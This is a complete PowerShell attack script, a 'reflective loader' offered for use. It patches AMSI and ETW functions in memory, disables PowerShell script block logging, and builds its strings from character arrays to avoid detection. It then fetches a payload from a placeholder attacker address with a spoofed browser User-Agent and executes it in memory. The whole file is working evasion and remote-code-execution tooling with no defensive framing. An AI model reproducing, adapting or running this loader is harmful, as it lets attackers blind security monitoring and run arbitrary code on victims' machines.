# Reflective PowerShell Loader
# Downloads a payload over HTTP and executes it entirely in memory.
#
# Evasion layers:
#   1. AmsiScanBuffer patch  — kills AMSI before any string is scanned
#   2. EtwEventWrite patch   — kills ETW telemetry (script block + process events)
#   3. Script block logging  — disabled via ETW provider reflection
#   4. No IEX / Invoke-Expression literals
#   5. No DownloadString literal — method called via reflection
#   6. All sensitive strings built from char arrays at runtime

# ── Config ────────────────────────────────────────────────────────────────────
$PayloadUrl = "http://<IP>/payload.ps1"
# ─────────────────────────────────────────────────────────────────────────────

# ── Helper: resolve exported function address via System.dll reflection ───────
function LookupFunc {
    Param($mod, $fn)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and
                       $_.Location.Split('\')[-1].Equals('System.dll') }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { if ($_.Name -eq 'GetProcAddress') { $tmp += $_ } }
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($mod)), $fn))
}

# ── Helper: build delegate type for unmanaged function pointer ────────────────
function MakeDelegate {
    Param([Type[]]$func, [Type]$ret = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('Rfl')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('M', $false).DefineType(
        'D', 'Class,Public,Sealed,AnsiClass,AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor(
        'RTSpecialName,HideBySig,Public',
        [System.Reflection.CallingConventions]::Standard,
        $func).SetImplementationFlags('Runtime,Managed')
    $type.DefineMethod(
        'Invoke', 'Public,HideBySig,NewSlot,Virtual', $ret, $func
    ).SetImplementationFlags('Runtime,Managed')
    return $type.CreateType()
}

# ── Helper: VirtualProtect wrapper ───────────────────────────────────────────
function Get-VpDelegate {
    # "kernel32.dll" + "VirtualProtect" — char arrays only
    $k32 = [string]::Join('', [char[]]@(107,101,114,110,101,108,51,50,46,100,108,108))
    $vp  = [string]::Join('', [char[]]@(86,105,114,116,117,97,108,80,114,111,116,101,99,116))
    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc $k32 $vp),
        (MakeDelegate @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType()) ([Bool]))
    )
}

# ── 1. AMSI bypass — patch AmsiScanBuffer → always return E_INVALIDARG ────────
function Bypass-Amsi {
    # "amsi.dll"
    $dll  = [string]::Join('', [char[]]@(97,109,115,105,46,100,108,108))
    # "AmsiScanBuffer"
    $scan = [string]::Join('', [char[]]@(65,109,115,105,83,99,97,110,66,117,102,102,101,114))

    $funcAddr = LookupFunc $dll $scan
    $vpd = Get-VpDelegate
    $old = 0

    # RWX
    $vpd.Invoke($funcAddr, 6, 0x40, [ref]$old) | Out-Null
    # mov eax, 0x80070057 (E_INVALIDARG) ; ret
    $patch = [Byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, 6)
    # Restore original protection
    $vpd.Invoke($funcAddr, 6, $old, [ref]$old) | Out-Null
}

# ── 2. ETW bypass — patch EtwEventWrite in ntdll → xor rax,rax ; ret ─────────
function Bypass-Etw {
    # "ntdll.dll"
    $ntdll = [string]::Join('', [char[]]@(110,116,100,108,108,46,100,108,108))
    # "EtwEventWrite"
    $etw   = [string]::Join('', [char[]]@(69,116,119,69,118,101,110,116,87,114,105,116,101))

    $funcAddr = LookupFunc $ntdll $etw
    $vpd = Get-VpDelegate
    $old = 0

    $vpd.Invoke($funcAddr, 4, 0x40, [ref]$old) | Out-Null
    # xor rax, rax (48 33 C0) ; ret (C3)
    $patch = [Byte[]]@(0x48, 0x33, 0xC0, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, 4)
    $vpd.Invoke($funcAddr, 4, $old, [ref]$old) | Out-Null
}

# ── 3. Disable Script Block Logging via ETW provider reflection ───────────────
function Disable-SBL {
    # "System.Management.Automation.Tracing.PSEtwLogProvider"
    $typeName = [string]::Join('', [char[]]@(
        83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,
        65,117,116,111,109,97,116,105,111,110,46,84,114,97,99,105,110,103,
        46,80,83,69,116,119,76,111,103,80,114,111,118,105,100,101,114))

    $t = [Ref].Assembly.GetType($typeName)
    if ($null -eq $t) { return }

    # "etwProvider"
    $fldName = [string]::Join('', [char[]]@(101,116,119,80,114,111,118,105,100,101,114))
    $provider = $t.GetField($fldName, 'NonPublic,Static').GetValue($null)

    # "m_enabled"
    $enaName = [string]::Join('', [char[]]@(109,95,101,110,97,98,108,101,100))
    $provider.GetType().GetField($enaName, 'NonPublic,Instance').SetValue($provider, [System.UInt32]0)
}

# ── 4. Download payload via reflection (no DownloadString literal) ────────────
function Get-Payload {
    Param([String]$url)
    $wc = New-Object System.Net.WebClient

    # Set a browser User-Agent to blend in
    # "User-Agent"
    $ua  = [string]::Join('', [char[]]@(85,115,101,114,45,65,103,101,110,116))
    $wc.Headers.Add($ua, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')

    # Invoke DownloadString via reflection — avoids the literal string
    $method = $wc.GetType().GetMethod('DownloadString', [Type[]]@([String]))
    return $method.Invoke($wc, @($url))
}

# ── Main ──────────────────────────────────────────────────────────────────────
Bypass-Amsi
Bypass-Etw
Disable-SBL

$code = Get-Payload -url $PayloadUrl

# Execute in memory — no IEX or Invoke-Expression literal
& ([ScriptBlock]::Create($code))
